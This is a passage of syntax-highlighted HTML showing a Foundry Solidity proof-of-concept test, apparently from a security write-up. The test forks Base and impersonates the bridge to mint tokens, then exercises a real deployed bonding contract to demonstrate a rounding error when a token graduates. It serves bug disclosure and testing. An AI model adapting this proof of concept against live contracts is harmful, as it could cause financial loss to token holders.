class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4200000000000000000000000000000000000010\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xF66DeA7b3e897cD44A5a231c61B6B4423d613259\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;alice\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;bob\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echarlie\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;charlie\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e45000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_519_750\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_rounding_error_upon_graduate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, ) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e45000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSignature\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;tokenInfo(address)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Failed to get token info\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;agentToken balance of pair  :\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;token balance of alice + bob:\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertNotEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan 